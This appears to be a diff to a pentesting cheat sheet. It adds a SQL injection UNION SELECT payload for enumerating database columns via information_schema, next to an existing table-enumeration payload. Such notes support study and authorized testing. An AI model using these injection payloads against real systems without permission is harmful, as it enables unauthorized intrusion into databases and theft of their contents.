@@ -83,6 +83,10 @@ Tables enumeration
 ```
 UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'BBDD' and table_name like '%';--
 ```
+Columns enumeration
+```
+UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='BBDD' and TABLE_NAME='nombre_tabla' and COLUMN_NAME like '%'
+```
 
 # Powershell
 
